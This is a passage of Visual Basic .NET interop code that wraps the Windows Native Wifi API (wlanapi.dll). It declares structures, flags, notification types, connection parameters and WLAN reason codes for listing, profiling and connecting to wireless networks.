        ''' Contains various flags for the network.
        ''' </summary>
        <Flags()> _
        Public Enum WlanAvailableNetworkFlags
            ''' <summary>
            ''' This network is currently connected.
            ''' </summary>
            Connected = &H1
            ''' <summary>
            ''' There is a profile for this network.
            ''' </summary>
            HasProfile = &H2
        End Enum

        ''' <summary>
        ''' Contains information about an available wireless network.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanAvailableNetwork
            ''' <summary>
            ''' Contains the profile name associated with the network.
            ''' If the network doesn't have a profile, this member will be empty.
            ''' If multiple profiles are associated with the network, there will be multiple entries with the same SSID in the visible network list. Profile names are case-sensitive.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=256)> _
            Public profileName As String
            ''' <summary>
            ''' Contains the SSID of the visible wireless network.
            ''' </summary>
            Public dot11Ssid As Dot11Ssid
            ''' <summary>
            ''' Specifies whether the network is infrastructure or ad hoc.
            ''' </summary>
            Public dot11BssType As Dot11BssType
            ''' <summary>
            ''' Indicates the number of BSSIDs in the network.
            ''' </summary>
            Public numberOfBssids As UInteger
            ''' <summary>
            ''' Indicates whether the network is connectable or not.
            ''' </summary>
            Public networkConnectable As Boolean
            ''' <summary>
            ''' Indicates why a network cannot be connected to. This member is only valid when <see cref="networkConnectable"/> is <c>false</c>.
            ''' </summary>
            Public wlanNotConnectableReason As WlanReasonCode
            ''' <summary>
            ''' The number of PHY types supported on available networks.
            ''' The maximum value of this field is 8. If more than 8 PHY types are supported, <see cref="morePhyTypes"/> must be set to <c>true</c>.
            ''' </summary>
            Private numberOfPhyTypes As UInteger
            ''' <summary>
            ''' Contains an array of <see cref="Dot11PhyType"/> values that represent the PHY types supported by the available networks.
            ''' When <see cref="numberOfPhyTypes"/> is greater than 8, this array contains only the first 8 PHY types.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=8)> _
            Private m_dot11PhyTypes As Dot11PhyType()
            ''' <summary>
            ''' Gets the <see cref="Dot11PhyType"/> values that represent the PHY types supported by the available networks.
            ''' </summary>
            Public ReadOnly Property Dot11PhyTypes() As Dot11PhyType()
                Get
                    Dim ret As Dot11PhyType() = New Dot11PhyType(numberOfPhyTypes - 1) {}
                    Array.Copy(m_dot11PhyTypes, ret, numberOfPhyTypes)
                    Return ret
                End Get
            End Property
            ''' <summary>
            ''' Specifies if there are more than 8 PHY types supported.
            ''' When this member is set to <c>true</c>, an application must call <see cref="WlanClient.WlanInterface.GetNetworkBssList"/> to get the complete list of PHY types.
            ''' <see cref="WlanBssEntry.phyId"/> contains the PHY type for an entry.
            ''' </summary>
            Public morePhyTypes As Boolean
            ''' <summary>
            ''' A percentage value that represents the signal quality of the network.
            ''' This field contains a value between 0 and 100.
            ''' A value of 0 implies an actual RSSI signal strength of -100 dbm.
            ''' A value of 100 implies an actual RSSI signal strength of -50 dbm.
            ''' You can calculate the RSSI signal strength value for values between 1 and 99 using linear interpolation.
            ''' </summary>
            Public wlanSignalQuality As UInteger
            ''' <summary>
            ''' Indicates whether security is enabled on the network.
            ''' </summary>
            Public securityEnabled As Boolean
            ''' <summary>
            ''' Indicates the default authentication algorithm used to join this network for the first time.
            ''' </summary>
            Public dot11DefaultAuthAlgorithm As Dot11AuthAlgorithm
            ''' <summary>
            ''' Indicates the default cipher algorithm to be used when joining this network.
            ''' </summary>
            Public dot11DefaultCipherAlgorithm As Dot11CipherAlgorithm
            ''' <summary>
            ''' Contains various flags for the network.
            ''' </summary>
            Public flags As WlanAvailableNetworkFlags
            ''' <summary>
            ''' Reserved for future use. Must be set to NULL.
            ''' </summary>
            Private reserved As UInteger
        End Structure

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanGetAvailableNetworkList(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal flags As WlanGetAvailableNetworkFlags, <[In](), Out()> ByVal reservedPtr As IntPtr, <Out()> ByRef availableNetworkListPtr As IntPtr) As Integer
        End Function

        <Flags()> _
        Public Enum WlanProfileFlags
            ''' <remarks>
            ''' The only option available on Windows XP SP2.
            ''' </remarks>
            AllUser = 0
            GroupPolicy = 1
            User = 2
        End Enum

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanSetProfile(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal flags As WlanProfileFlags, <[In](), MarshalAs(UnmanagedType.LPWStr)> ByVal profileXml As String, <[In](), [Optional](), MarshalAs(UnmanagedType.LPWStr)> ByVal allUserProfileSecurity As String, <[In]()> ByVal overwrite As Boolean, _
   <[In]()> ByVal pReserved As IntPtr, <Out()> ByRef reasonCode As WlanReasonCode) As Integer
        End Function

        ''' <summary>
        ''' Defines the access mask of an all-user profile.
        ''' </summary>
        <Flags()> _
        Public Enum WlanAccess
            ''' <summary>
            ''' The user can view profile permissions.
            ''' </summary>
            ReadAccess = &H20000 Or &H1
            ''' <summary>
            ''' The user has read access, and the user can also connect to and disconnect from a network using the profile.
            ''' </summary>
            ExecuteAccess = ReadAccess Or &H20
            ''' <summary>
            ''' The user has execute access and the user can also modify and delete permissions associated with a profile.
            ''' </summary>
            WriteAccess = ReadAccess Or ExecuteAccess Or &H2 Or &H10000 Or &H40000
        End Enum

        ''' <param name="flags">Not supported on Windows XP SP2: must be a <c>null</c> reference.</param>
        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanGetProfile(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In](), MarshalAs(UnmanagedType.LPWStr)> ByVal profileName As String, <[In]()> ByVal pReserved As IntPtr, <Out()> ByRef profileXml As IntPtr, <Out(), [Optional]()> ByRef flags As WlanProfileFlags, _
   <Out(), [Optional]()> ByRef grantedAccess As WlanAccess) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanGetProfileList(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal pReserved As IntPtr, <Out()> ByRef profileList As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Sub WlanFreeMemory(ByVal pMemory As IntPtr)
        End Sub

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanReasonCodeToString(<[In]()> ByVal reasonCode As WlanReasonCode, <[In]()> ByVal bufferSize As Integer, <[In](), Out()> ByVal stringBuffer As StringBuilder, ByVal pReserved As IntPtr) As Integer
        End Function

        ''' <summary>
        ''' Specifies where the notification comes from.
        ''' </summary>
        <Flags()> _
        Public Enum WlanNotificationSource
            None = 0
            ''' <summary>
            ''' All notifications, including those generated by the 802.1X module.
            ''' </summary>
            All = &HFFFF
            ''' <summary>
            ''' Notifications generated by the auto configuration module.
            ''' </summary>
            ACM = &H8
            ''' <summary>
            ''' Notifications generated by MSM.
            ''' </summary>
            MSM = &H10
            ''' <summary>
            ''' Notifications generated by the security module.
            ''' </summary>
            Security = &H20
            ''' <summary>
            ''' Notifications generated by independent hardware vendors (IHV).
            ''' </summary>
            IHV = &H40
        End Enum

        ''' <summary>
        ''' Indicates the type of an ACM (<see cref="WlanNotificationSource.ACM"/>) notification.
        ''' </summary>
        ''' <remarks>
        ''' The enumeration identifiers correspond to the native <c>wlan_notification_acm_</c> identifiers.
        ''' On Windows XP SP2, only the <c>ConnectionComplete</c> and <c>Disconnected</c> notifications are available.
        ''' </remarks>
        Public Enum WlanNotificationCodeAcm
            AutoconfEnabled = 1
            AutoconfDisabled
            BackgroundScanEnabled
            BackgroundScanDisabled
            BssTypeChange
            PowerSettingChange
            ScanComplete
            ScanFail
            ConnectionStart
            ConnectionComplete
            ConnectionAttemptFail
            FilterListChange
            InterfaceArrival
            InterfaceRemoval
            ProfileChange
            ProfileNameChange
            ProfilesExhausted
            NetworkNotAvailable
            NetworkAvailable
            Disconnecting
            Disconnected
            AdhocNetworkStateChange
        End Enum

        ''' <summary>
        ''' Indicates the type of an MSM (<see cref="WlanNotificationSource.MSM"/>) notification.
        ''' </summary>
        ''' <remarks>
        ''' The enumeration identifiers correspond to the native <c>wlan_notification_msm_</c> identifiers.
        ''' </remarks>
        Public Enum WlanNotificationCodeMsm
            Associating = 1
            Associated
            Authenticating
            Connected
            RoamingStart
            RoamingEnd
            RadioStateChange
            SignalQualityChange
            Disassociating
            Disconnected
            PeerJoin
            PeerLeave
            AdapterRemoval
            AdapterOperationModeChange
        End Enum

        ''' <summary>
        ''' Contains information provided when registering for notifications.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_NOTIFICATION_DATA</c> type.
        ''' </remarks>
        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanNotificationData
            ''' <summary>
            ''' Specifies where the notification comes from.
            ''' </summary>
            ''' <remarks>
            ''' On Windows XP SP2, this field must be set to <see cref="WlanNotificationSource.None"/>, <see cref="WlanNotificationSource.All"/> or <see cref="WlanNotificationSource.ACM"/>.
            ''' </remarks>
            Public notificationSource As WlanNotificationSource
            ''' <summary>
            ''' Indicates the type of notification. The value of this field indicates what type of associated data will be present in <see cref="dataPtr"/>.
            ''' </summary>
            Public m_notificationCode As Integer
            ''' <summary>
            ''' Indicates which interface the notification is for.
            ''' </summary>
            Public interfaceGuid As Guid
            ''' <summary>
            ''' Specifies the size of <see cref="dataPtr"/>, in bytes.
            ''' </summary>
            Public dataSize As Integer
            ''' <summary>
            ''' Pointer to additional data needed for the notification, as indicated by <see cref="notificationCode"/>.
            ''' </summary>
            Public dataPtr As IntPtr

            ''' <summary>
            ''' Gets the notification code (in the correct enumeration type) according to the notification source.
            ''' </summary>
            Public ReadOnly Property NotificationCode() As Object
                Get
                    If notificationSource = WlanNotificationSource.MSM Then
                        Return CType(m_notificationCode, WlanNotificationCodeMsm)
                    ElseIf notificationSource = WlanNotificationSource.ACM Then
                        Return CType(m_notificationCode, WlanNotificationCodeAcm)
                    Else
                        Return m_notificationCode
                    End If
                End Get
            End Property

        End Structure

        ''' <summary>
        ''' Defines the callback function which accepts WLAN notifications.
        ''' </summary>
        Public Delegate Sub WlanNotificationCallbackDelegate(ByRef notificationData As WlanNotificationData, ByVal context As IntPtr)

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanRegisterNotification(<[In]()> ByVal clientHandle As IntPtr, <[In]()> ByVal notifSource As WlanNotificationSource, <[In]()> ByVal ignoreDuplicate As Boolean, <[In]()> ByVal funcCallback As WlanNotificationCallbackDelegate, <[In]()> ByVal callbackContext As IntPtr, <[In]()> ByVal reserved As IntPtr, _
   <Out()> ByRef prevNotifSource As WlanNotificationSource) As Integer
        End Function

        ''' <summary>
        ''' Defines connection parameter flags.
        ''' </summary>
        <Flags()> _
        Public Enum WlanConnectionFlags
            ''' <summary>
            ''' Connect to the destination network even if the destination is a hidden network. A hidden network does not broadcast its SSID. Do not use this flag if the destination network is an ad-hoc network.
            ''' <para>If the profile specified by <see cref="WlanConnectionParameters.profile"/> is not <c>null</c>, then this flag is ignored and the nonBroadcast profile element determines whether to connect to a hidden network.</para>
            ''' </summary>
            HiddenNetwork = &H1
            ''' <summary>
            ''' Do not form an ad-hoc network. Only join an ad-hoc network if the network already exists. Do not use this flag if the destination network is an infrastructure network.
            ''' </summary>
            AdhocJoinOnly = &H2
            ''' <summary>
            ''' Ignore the privacy bit when connecting to the network. Ignoring the privacy bit has the effect of ignoring whether packets are encryption and ignoring the method of encryption used. Only use this flag when connecting to an infrastructure network using a temporary profile.
            ''' </summary>
            IgnorePrivacyBit = &H4
            ''' <summary>
            ''' Exempt EAPOL traffic from encryption and decryption. This flag is used when an application must send EAPOL traffic over an infrastructure network that uses Open authentication and WEP encryption. This flag must not be used to connect to networks that require 802.1X authentication. This flag is only valid when <see cref="WlanConnectionParameters.wlanConnectionMode"/> is set to <see cref="WlanConnectionMode.TemporaryProfile"/>. Avoid using this flag whenever possible.
            ''' </summary>
            EapolPassthrough = &H8
        End Enum

        ''' <summary>
        ''' Specifies the parameters used when using the <see cref="WlanConnect"/> function.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_CONNECTION_PARAMETERS</c> type.
        ''' </remarks>
        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanConnectionParameters
            ''' <summary>
            ''' Specifies the mode of connection.
            ''' </summary>
            Public wlanConnectionMode As WlanConnectionMode
            ''' <summary>
            ''' Specifies the profile being used for the connection.
            ''' The contents of the field depend on the <see cref="wlanConnectionMode"/>:
            ''' <list type="table">
            ''' <listheader>
            ''' <term>Value of <see cref="wlanConnectionMode"/></term>
            ''' <description>Contents of the profile string</description>
            ''' </listheader>
            ''' <item>
            ''' <term><see cref="WlanConnectionMode.Profile"/></term>
            ''' <description>The name of the profile used for the connection.</description>
            ''' </item>
            ''' <item>
            ''' <term><see cref="WlanConnectionMode.TemporaryProfile"/></term>
            ''' <description>The XML representation of the profile used for the connection.</description>
            ''' </item>
            ''' <item>
            ''' <term><see cref="WlanConnectionMode.DiscoverySecure"/>, <see cref="WlanConnectionMode.DiscoveryUnsecure"/> or <see cref="WlanConnectionMode.Auto"/></term>
            ''' <description><c>null</c></description>
            ''' </item>
            ''' </list>
            ''' </summary>
            <MarshalAs(UnmanagedType.LPWStr)> _
            Public profile As String
            ''' <summary>
            ''' Pointer to a <see cref="Dot11Ssid"/> structure that specifies the SSID of the network to connect to.
            ''' This field is optional. When set to <c>null</c>, all SSIDs in the profile will be tried.
            ''' This field must not be <c>null</c> if <see cref="wlanConnectionMode"/> is set to <see cref="WlanConnectionMode.DiscoverySecure"/> or <see cref="WlanConnectionMode.DiscoveryUnsecure"/>.
            ''' </summary>
            Public dot11SsidPtr As IntPtr
            ''' <summary>
            ''' Pointer to a <see cref="Dot11BssidList"/> structure that contains the list of basic service set (BSS) identifiers desired for the connection.
            ''' </summary>
            ''' <remarks>
            ''' On Windows XP SP2, must be set to <c>null</c>.
            ''' </remarks>
            Public desiredBssidListPtr As IntPtr
            ''' <summary>
            ''' A <see cref="Dot11BssType"/> value that indicates the BSS type of the network. If a profile is provided, this BSS type must be the same as the one in the profile.
            ''' </summary>
            Public dot11BssType As Dot11BssType
            ''' <summary>
            ''' Specifies ocnnection parameters.
            ''' </summary>
            ''' <remarks>
            ''' On Windows XP SP2, must be set to 0.
            ''' </remarks>
            Public flags As WlanConnectionFlags
        End Structure

        ''' <summary>
        ''' The connection state of an ad hoc network.
        ''' </summary>
        Public Enum WlanAdhocNetworkState
            ''' <summary>
            ''' The ad hoc network has been formed, but no client or host is connected to the network.
            ''' </summary>
            Formed = 0
            ''' <summary>
            ''' A client or host is connected to the ad hoc network.
            ''' </summary>
            Connected = 1
        End Enum

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanConnect(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByRef connectionParameters As WlanConnectionParameters, ByVal pReserved As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanDeleteProfile(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In](), MarshalAs(UnmanagedType.LPWStr)> ByVal profileName As String, ByVal reservedPtr As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanGetNetworkBssList(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal dot11SsidInt As IntPtr, <[In]()> ByVal dot11BssType As Dot11BssType, <[In]()> ByVal securityEnabled As Boolean, ByVal reservedPtr As IntPtr, _
   <Out()> ByRef wlanBssList As IntPtr) As Integer
        End Function

        <StructLayout(LayoutKind.Sequential)> _
        Friend Structure WlanBssListHeader
            Friend totalSize As UInteger
            Friend numberOfItems As UInteger
        End Structure

        ''' <summary>
        ''' Contains information about a basic service set (BSS).
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanBssEntry
            ''' <summary>
            ''' Contains the SSID of the access point (AP) associated with the BSS.
            ''' </summary>
            Public dot11Ssid As Dot11Ssid
            ''' <summary>
            ''' The identifier of the PHY on which the AP is operating.
            ''' </summary>
            Public phyId As UInteger
            ''' <summary>
            ''' Contains the BSS identifier.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=6)> _
            Public dot11Bssid As Byte()
            ''' <summary>
            ''' Specifies whether the network is infrastructure or ad hoc.
            ''' </summary>
            Public dot11BssType As Dot11BssType
            Public dot11BssPhyType As Dot11PhyType
            ''' <summary>
            ''' The received signal strength in dBm.
            ''' </summary>
            Public rssi As Integer
            ''' <summary>
            ''' The link quality reported by the driver. Ranges from 0-100.
            ''' </summary>
            Public linkQuality As UInteger
            ''' <summary>
            ''' If 802.11d is not implemented, the network interface card (NIC) must set this field to TRUE. If 802.11d is implemented (but not necessarily enabled), the NIC must set this field to TRUE if the BSS operation complies with the configured regulatory domain.
            ''' </summary>
            Public inRegDomain As Boolean
            ''' <summary>
            ''' Contains the beacon interval value from the beacon packet or probe response.
            ''' </summary>
            Public beaconPeriod As UShort
            ''' <summary>
            ''' The timestamp from the beacon packet or probe response.
            ''' </summary>
            Public timestamp As ULong
            ''' <summary>
            ''' The host timestamp value when the beacon or probe response is received.
            ''' </summary>
            Public hostTimestamp As ULong
            ''' <summary>
            ''' The capability value from the beacon packet or probe response.
            ''' </summary>
            Public capabilityInformation As UShort
            ''' <summary>
            ''' The frequency of the center channel, in kHz.
            ''' </summary>
            Public chCenterFrequency As UInteger
            ''' <summary>
            ''' Contains the set of data transfer rates supported by the BSS.
            ''' </summary>
            Public wlanRateSet As WlanRateSet
            ''' <summary>
            ''' Offset of the information element (IE) data blob.
            ''' </summary>
            Public ieOffset As UInteger
            ''' <summary>
            ''' Size of the IE data blob, in bytes.
            ''' </summary>
            Public ieSize As UInteger
        End Structure

        ''' <summary>
        ''' Contains the set of supported data rates.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Public Structure WlanRateSet
            ''' <summary>
            ''' The length, in bytes, of <see cref="rateSet"/>.
            ''' </summary>
            Private rateSetLength As UInteger
            ''' <summary>
            ''' An array of supported data transfer rates.
            ''' If the rate is a basic rate, the first bit of the rate value is set to 1.
            ''' A basic rate is the data transfer rate that all stations in a basic service set (BSS) can use to receive frames from the wireless medium.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=126)> _
            Private rateSet As UShort()

            Public ReadOnly Property Rates() As UShort()
                Get
                    Dim rates__1 As UShort() = New UShort(rateSetLength \ 2 - 1) {}
                    Array.Copy(rateSet, rates__1, rates__1.Length)
                    Return rates__1
                End Get
            End Property

            ''' <summary>
            ''' CalculateS the data transfer rate in Mbps for an arbitrary supported rate.
            ''' </summary>
            ''' <param name="rate"></param>
            ''' <returns></returns>
            Public Function GetRateInMbps(ByVal rate As Integer) As Double
                Return (rateSet(rate) And &H7FFF) * 0.5
            End Function
        End Structure

        ''' <summary>
        ''' Represents an error occuring during WLAN operations which indicate their failure via a <see cref="WlanReasonCode"/>.
        ''' </summary>
        Public Class WlanException
            Inherits Exception
            Private m_reasonCode As WlanReasonCode

            Private Sub New(ByVal reasonCode As WlanReasonCode)
                Me.m_reasonCode = reasonCode
            End Sub

            ''' <summary>
            ''' Gets the WLAN reason code.
            ''' </summary>
            ''' <value>The WLAN reason code.</value>
            Public ReadOnly Property ReasonCode() As WlanReasonCode
                Get
                    Return m_reasonCode
                End Get
            End Property

            ''' <summary>
            ''' Gets a message that describes the reason code.
            ''' </summary>
            ''' <value></value>
            ''' <returns>The error message that explains the reason for the exception, or an empty string("").</returns>
            Public Overrides ReadOnly Property Message() As String
                Get
                    Dim sb As New StringBuilder(1024)
                    If WlanReasonCodeToString(m_reasonCode, sb.Capacity, sb, IntPtr.Zero) = 0 Then
                        Return sb.ToString()
                    Else
                        Return String.Empty
                    End If
                End Get
            End Property
        End Class

        ' TODO: .NET-ify the WlanReasonCode enum (naming convention + docs).

        ''' <summary>
        ''' Specifies reasons for a failure of a WLAN operation.
        ''' </summary>
        ''' <remarks>
        ''' To get the WLAN API native reason code identifiers, prefix the identifiers with <c>WLAN_REASON_CODE_</c>.
        ''' </remarks>
        Public Enum WlanReasonCode
            Success = 0
            ' general codes
            UNKNOWN = &H10000 + 1

            RANGE_SIZE = &H10000
            BASE = &H10000 + RANGE_SIZE

            ' range for Auto Config
            '
            AC_BASE = &H10000 + RANGE_SIZE
            AC_CONNECT_BASE = (AC_BASE + RANGE_SIZE / 2)
            AC_END = (AC_BASE + RANGE_SIZE - 1)

            ' range for profile manager
            ' it has profile adding failure reason codes, but may not have 
            ' connection reason codes
            '
            PROFILE_BASE = &H10000 + (7 * RANGE_SIZE)
            PROFILE_CONNECT_BASE = (PROFILE_BASE + RANGE_SIZE / 2)
            PROFILE_END = (PROFILE_BASE + RANGE_SIZE - 1)

            ' range for MSM
            '
            MSM_BASE = &H10000 + (2 * RANGE_SIZE)
            MSM_CONNECT_BASE = (MSM_BASE + RANGE_SIZE / 2)
            MSM_END = (MSM_BASE + RANGE_SIZE - 1)

            ' range for MSMSEC
            '
            MSMSEC_BASE = &H10000 + (3 * RANGE_SIZE)
            MSMSEC_CONNECT_BASE = (MSMSEC_BASE + RANGE_SIZE / 2)
            MSMSEC_END = (MSMSEC_BASE + RANGE_SIZE - 1)

            ' AC network incompatible reason codes
            '
            NETWORK_NOT_COMPATIBLE = (AC_BASE + 1)
            PROFILE_NOT_COMPATIBLE = (AC_BASE + 2)

            ' AC connect reason code
            '
            NO_AUTO_CONNECTION = (AC_CONNECT_BASE + 1)
            NOT_VISIBLE = (AC_CONNECT_BASE + 2)
            GP_DENIED = (AC_CONNECT_BASE + 3)
            USER_DENIED = (AC_CONNECT_BASE + 4)
            BSS_TYPE_NOT_ALLOWED = (AC_CONNECT_BASE + 5)
            IN_FAILED_LIST = (AC_CONNECT_BASE + 6)
            IN_BLOCKED_LIST = (AC_CONNECT_BASE + 7)
            SSID_LIST_TOO_LONG = (AC_CONNECT_BASE + 8)
            CONNECT_CALL_FAIL = (AC_CONNECT_BASE + 9)
            SCAN_CALL_FAIL = (AC_CONNECT_BASE + 10)
            NETWORK_NOT_AVAILABLE = (AC_CONNECT_BASE + 11)
            PROFILE_CHANGED_OR_DELETED = (AC_CONNECT_BASE + 12)
            KEY_MISMATCH = (AC_CONNECT_BASE + 13)
            USER_NOT_RESPOND = (AC_CONNECT_BASE + 14)

            ' Profile validation errors
            '
            INVALID_PROFILE_SCHEMA = (PROFILE_BASE + 1)
            PROFILE_MISSING = (PROFILE_BASE + 2)
            INVALID_PROFILE_NAME = (PROFILE_BASE + 3)
            INVALID_PROFILE_TYPE = (PROFILE_BASE + 4)
            INVALID_PHY_TYPE = (PROFILE_BASE + 5)
            MSM_SECURITY_MISSING = (PROFILE_BASE + 6)
            IHV_SECURITY_NOT_SUPPORTED = (PROFILE_BASE + 7)
            IHV_OUI_MISMATCH = (PROFILE_BASE + 8)
            ' IHV OUI not present but there is IHV settings in profile
            IHV_OUI_MISSING = (PROFILE_BASE + 9)
            ' IHV OUI is present but there is no IHV settings in profile
            IHV_SETTINGS_MISSING = (PROFILE_BASE + 10)
            ' both/conflict MSMSec and IHV security settings exist in profile 
            CONFLICT_SECURITY = (PROFILE_BASE + 11)
            ' no IHV or MSMSec security settings in profile
            SECURITY_MISSING = (PROFILE_BASE + 12)
            INVALID_BSS_TYPE = (PROFILE_BASE + 13)
            INVALID_ADHOC_CONNECTION_MODE = (PROFILE_BASE + 14)
            NON_BROADCAST_SET_FOR_ADHOC = (PROFILE_BASE + 15)
            AUTO_SWITCH_SET_FOR_ADHOC = (PROFILE_BASE + 16)
            AUTO_SWITCH_SET_FOR_MANUAL_CONNECTION = (PROFILE_BASE + 17)
            IHV_SECURITY_ONEX_MISSING = (PROFILE_BASE + 18)
            PROFILE_SSID_INVALID = (PROFILE_BASE + 19)
            TOO_MANY_SSID = (PROFILE_BASE + 20)

            ' MSM network incompatible reasons
            '
            UNSUPPORTED_SECURITY_SET_BY_OS = (MSM_BASE + 1)
            UNSUPPORTED_SECURITY_SET = (MSM_BASE + 2)
            BSS_TYPE_UNMATCH = (MSM_BASE + 3)
            PHY_TYPE_UNMATCH = (MSM_BASE + 4)
            DATARATE_UNMATCH = (MSM_BASE + 5)

            ' MSM connection failure reasons, to be defined
            ' failure reason codes
            '
            ' user called to disconnect
            USER_CANCELLED = (MSM_CONNECT_BASE + 1)
            ' got disconnect while associating
            ASSOCIATION_FAILURE = (MSM_CONNECT_BASE + 2)
            ' timeout for association
            ASSOCIATION_TIMEOUT = (MSM_CONNECT_BASE + 3)
            ' pre-association security completed with failure
            PRE_SECURITY_FAILURE = (MSM_CONNECT_BASE + 4)
            ' fail to start post-association security
            START_SECURITY_FAILURE = (MSM_CONNECT_BASE + 5)
            ' post-association security completed with failure
            SECURITY_FAILURE = (MSM_CONNECT_BASE + 6)
            ' security watchdog timeout
            SECURITY_TIMEOUT = (MSM_CONNECT_BASE + 7)
            ' got disconnect from driver when roaming
            ROAMING_FAILURE = (MSM_CONNECT_BASE + 8)
            ' failed to start security for roaming
            ROAMING_SECURITY_FAILURE = (MSM_CONNECT_BASE + 9)
            ' failed to start security for adhoc-join
            ADHOC_SECURITY_FAILURE = (MSM_CONNECT_BASE + 10)
            ' got disconnection from driver
            DRIVER_DISCONNECTED = (MSM_CONNECT_BASE + 11)
            ' driver operation failed
            DRIVER_OPERATION_FAILURE = (MSM_CONNECT_BASE + 12)
            ' Ihv service is not available
            IHV_NOT_AVAILABLE = (MSM_CONNECT_BASE + 13)
            ' Response from ihv timed out
            IHV_NOT_RESPONDING = (MSM_CONNECT_BASE + 14)
            ' Timed out waiting for driver to disconnect
            DISCONNECT_TIMEOUT = (MSM_CONNECT_BASE + 15)
            ' An internal error prevented the operation from being completed.
            INTERNAL_FAILURE = (MSM_CONNECT_BASE + 16)
            ' UI Request timed out.
            UI_REQUEST_TIMEOUT = (MSM_CONNECT_BASE + 17)
            ' Roaming too often, post security is not completed after 5 times.
            TOO_MANY_SECURITY_ATTEMPTS = (MSM_CONNECT_BASE + 18)

            ' MSMSEC reason codes
            '

            MSMSEC_MIN = MSMSEC_BASE

            ' Key index specified is not valid
            MSMSEC_PROFILE_INVALID_KEY_INDEX = (MSMSEC_BASE + 1)
            ' Key required, PSK present
            MSMSEC_PROFILE_PSK_PRESENT = (MSMSEC_BASE + 2)
            ' Invalid key length
            MSMSEC_PROFILE_KEY_LENGTH = (MSMSEC_BASE + 3)
            ' Invalid PSK length
            MSMSEC_PROFILE_PSK_LENGTH = (MSMSEC_BASE + 4)
            ' No auth/cipher specified
            MSMSEC_PROFILE_NO_AUTH_CIPHER_SPECIFIED = (MSMSEC_BASE + 5)
            ' Too many auth/cipher specified
            MSMSEC_PROFILE_TOO_MANY_AUTH_CIPHER_SPECIFIED = (MSMSEC_BASE + 6)
            ' Profile contains duplicate auth/cipher
            MSMSEC_PROFILE_DUPLICATE_AUTH_CIPHER = (MSMSEC_BASE + 7)
            ' Profile raw data is invalid (1x or key data)
            MSMSEC_PROFILE_RAWDATA_INVALID = (MSMSEC_BASE + 8)
            ' Invalid auth/cipher combination
            MSMSEC_PROFILE_INVALID_AUTH_CIPHER = (MSMSEC_BASE + 9)
            ' 802.1x disabled when it's required to be enabled
            MSMSEC_PROFILE_ONEX_DISABLED = (MSMSEC_BASE + 10)
            ' 802.1x enabled when it's required to be disabled
            MSMSEC_PROFILE_ONEX_ENABLED = (MSMSEC_BASE + 11)
            MSMSEC_PROFILE_INVALID_PMKCACHE_MODE = (MSMSEC_BASE + 12)
            MSMSEC_PROFILE_INVALID_PMKCACHE_SIZE = (MSMSEC_BASE + 13)
            MSMSEC_PROFILE_INVALID_PMKCACHE_TTL = (MSMSEC_BASE + 14)
            MSMSEC_PROFILE_INVALID_PREAUTH_MODE = (MSMSEC_BASE + 15)
            MSMSEC_PROFILE_INVALID_PREAUTH_THROTTLE = (MSMSEC_BASE + 16)
            ' PreAuth enabled when PMK cache is disabled
            MSMSEC_PROFILE_PREAUTH_ONLY_ENABLED = (MSMSEC_BASE + 17)
            ' Capability matching failed at network
            MSMSEC_CAPABILITY_NETWORK = (MSMSEC_BASE + 18)
            ' Capability matching failed at NIC
            MSMSEC_CAPABILITY_NIC = (MSMSEC_BASE + 19)
            ' Capability matching failed at profile
            MSMSEC_CAPABILITY_PROFILE = (MSMSEC_BASE + 20)
            ' Network does not support specified discovery type
            MSMSEC_CAPABILITY_DISCOVERY = (MSMSEC_BASE + 21)
            ' Passphrase contains invalid character
            MSMSEC_PROFILE_PASSPHRASE_CHAR = (MSMSEC_BASE + 22)
            ' Key material contains invalid character
            MSMSEC_PROFILE_KEYMATERIAL_CHAR = (MSMSEC_BASE + 23)
            ' Wrong key type specified for the auth/cipher pair
            MSMSEC_PROFILE_WRONG_KEYTYPE = (MSMSEC_BASE + 24)
            ' "Mixed cell" suspected (AP not beaconing privacy, we have privacy enabled profile)
            MSMSEC_MIXED_CELL = (MSMSEC_BASE + 25)
            ' Auth timers or number of timeouts in profile is incorrect
            MSMSEC_PROFILE_AUTH_TIMERS_INVALID = (MSMSEC_BASE + 26)
            ' Group key update interval in profile is incorrect
            MSMSEC_PROFILE_INVALID_GKEY_INTV = (MSMSEC_BASE + 27)
            ' "Transition network" suspected, trying legacy 802.11 security
